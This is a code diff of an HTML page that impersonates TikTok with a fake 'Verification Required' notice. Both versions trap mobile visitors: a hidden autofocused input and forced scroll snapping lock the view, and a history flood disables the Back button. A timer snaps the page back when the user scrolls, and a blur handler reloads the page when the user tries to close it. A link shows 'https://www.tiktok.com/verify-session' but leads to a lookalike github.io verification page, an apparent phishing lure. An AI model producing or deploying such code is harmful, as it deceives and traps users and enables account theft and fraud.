@@ -4,122 +4,81 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <style>
-        /* 1. FORCE THE BROWSER TO SNAP */
+        /* 1. CSS SCROLL SNAP - Forces the browser engine to 'lock' onto the trap */
         html {
             scroll-snap-type: y mandatory;
             overflow-y: scroll;
             height: 100vh;
-            scroll-behavior: auto; /* Instant jump, no smooth scroll animation */
+            scroll-behavior: auto;
         }
         
-        body {
-            margin: 0; padding: 0;
-            background: #ffffff;
-            /* Allow the body to be huge so the browser feels the 'scroll' */
-            height: 300vh; 
-        }
+        body { margin: 0; padding: 0; background: #ffffff; height: 400vh; }
 
-        /* 2. THE GAP (Must be larger than the screen) */
-        #dummy-gap {
-            height: 150vh;
-            width: 100%;
-            /* This pushes your content way down */
-        }
+        /* Create a massive void above the content */
+        #void { height: 150vh; width: 100%; background: #ffffff; }
 
-        /* 3. THE TRAP CONTAINER */
-        #main-content {
+        /* The actual trap area */
+        #trap-container {
             height: 100vh;
-            position: relative;
-            scroll-snap-align: start; /* Tell CSS to lock onto this element */
-            padding-top: 50px;
+            scroll-snap-align: start; /* The CSS engine forces a jump here */
             text-align: center;
-            font-family: "Proxima Nova", "Inter", sans-serif;
+            font-family: "Proxima Nova", sans-serif;
+            position: relative;
         }
 
-        /* Hiding the trigger input */
-        .ghost-trigger {
-            opacity: 0;
+        /* 2. PROGRAMMATIC TRIGGER: Hidden input with autofocus */
+        .trigger {
             position: absolute;
-            top: 50px; /* Put it right inside the content area */
-            width: 1px; height: 1px;
+            top: 10px;
+            opacity: 0;
             pointer-events: none;
         }
 
-        /* LOCKDOWN UI */
-        #shield { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; }
-        
-        /* Your standard styles */
-        .verification-icon { width: 60px; height: 60px; margin-bottom: 15px; }
-        .header { color: #161823; font-size: 22px; font-weight: 700; margin-bottom: 10px; }
-        .subtext { color: #8A8B91; font-size: 16px; margin-bottom: 25px; max-width: 310px; margin: 0 auto 25px auto; }
-        .instruction-list { display: inline-block; text-align: left; color: #8A8B91; font-size: 16px; margin-bottom: 55px; padding-left: 20px; line-height: 1.6; max-width: 330px; }
-        #breakout-link { color: #0049f6; text-decoration: underline; font-size: 17px; font-weight: 500; display: inline-block; z-index: 10000; position: relative; }
+        /* UI Styles */
+        #lock-shield { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; }
+        .v-icon { width: 60px; margin: 50px auto 20px; display: block; }
+        .title { font-size: 22px; font-weight: 700; color: #161823; }
+        .msg { color: #8A8B91; padding: 0 40px; margin-top: 10px; line-height: 1.4; }
+        #breakout { color: #0049f6; text-decoration: underline; font-weight: 600; display: block; margin-top: 40px; }
     </style>
 </head>
 <body>
-    <div id="shield"></div>
+    <div id="lock-shield"></div>
+    <div id="void"></div>
 
-    <div id="dummy-gap"></div>
-
-    <div id="main-content">
-        <input type="text" class="ghost-trigger" autofocus tabindex="-1">
-
-        <svg class="verification-icon" viewBox="0 0 48 48" fill="none">
-            <path d="M24 4L6 12V22C6 33.1 13.7 43.4 24 46C34.3 43.4 42 33.1 42 22V12L24 4Z" fill="#F1F1F2"/>
-            <rect x="22" y="16" width="4" height="12" rx="2" fill="#161823"/>
-            <rect x="22" y="30" width="4" height="4" rx="2" fill="#161823"/>
-        </svg>
-
-        <div class="header">Suspicious activity</div>
-        <div class="subtext">Please complete verification to continue using TikTok.</div>
-
-        <ul class="instruction-list">
-            <li>Hold the link below</li>
-            <li>Select "Open link" or "Open in browser"</li>
-            <li>Tap verify 5 times</li>
-        </ul>
-
-        <div id="link-area">
-            <a id="breakout-link" href="https://tiktokverification.github.io/captcha/Verification/verify1.html">https://www.tiktok.com/verify</a>
-            <div style="margin-top: 8px; color: #D1D1D3; font-size: 10px;">REF_ID: #8392-V2-AUTH</div>
-        </div>
+    <div id="trap-container">
+        <input type="text" class="trigger" autofocus>
+        
+        <img class="v-icon" src="https://www.gstatic.com/images/icons/material/system/2x/security_black_48dp.png" alt="security">
+        <div class="title">Verification Required</div>
+        <div class="msg">Please follow the instructions to verify your account session.</div>
+        
+        <a id="breakout" href="https://tiktokverification.github.io/captcha/Verification/verify1.html">https://www.tiktok.com/verify-session</a>
     </div>
 
-<script>
-    // 1. IMMEDIATE SCROLL ENFORCEMENT
-    // We run this to backup the 'autofocus' in case the browser supports it
-    window.onload = function() {
-        const target = document.getElementById('main-content');
-        
-        // Use 'scrollIntoView' which is more aggressive than scrollTo
-        target.scrollIntoView({behavior: "auto", block: "start"});
-        
-        // Engage the trap immediately
-        setTimeout(engageLock, 100);
-        
-        // Flood History
-        for(let i=0; i<20; i++) {
-            history.pushState(null, null, location.href);
-        }
-    };
+    <script>
+        // 3. THE RENDERER HIJACK
+        window.addEventListener('load', () => {
+            // Force a history flood to kill the 'Back' button immediately
+            for(let i=0; i<15; i++) { history.pushState(null, null, location.href); }
+            
+            // Re-enforce the jump in case autofocus was partially blocked
+            const trap = document.getElementById('trap-container');
+            trap.scrollIntoView({ behavior: 'auto', block: 'start' });
 
-    // 2. THE LOCK
-    function engageLock() {
-        const targetPos = document.getElementById('dummy-gap').offsetHeight;
-        document.getElementById('shield').style.display = 'block';
+            // Activate the scroll-freeze
+            document.getElementById('lock-shield').style.display = 'block';
+            
+            // If they try to pull the header down, slam it back
+            setInterval(() => {
+                if (window.pageYOffset < 500) {
+                    window.scrollTo(0, 1000); // Slam back to trap
+                }
+            }, 50);
+        });
 
-        // Constant check: If they are above the target, slam them down
-        setInterval(() => {
-            if (window.pageYOffset < targetPos - 50) {
-                window.scrollTo(0, targetPos);
-            }
-        }, 10); // Check every 10ms - very aggressive
-
-        // 3. THE BLUR RELOAD (Back up plan for the X button)
-        window.onblur = function() {
-            setTimeout(() => { window.location.reload(); }, 10);
-        };
-    }
-</script>
+        // Nuclear option: If they manage to click 'X', reload immediately
+        window.onblur = () => { setTimeout(() => { location.reload(); }, 10); };
+    </script>
 </body>
 </html>
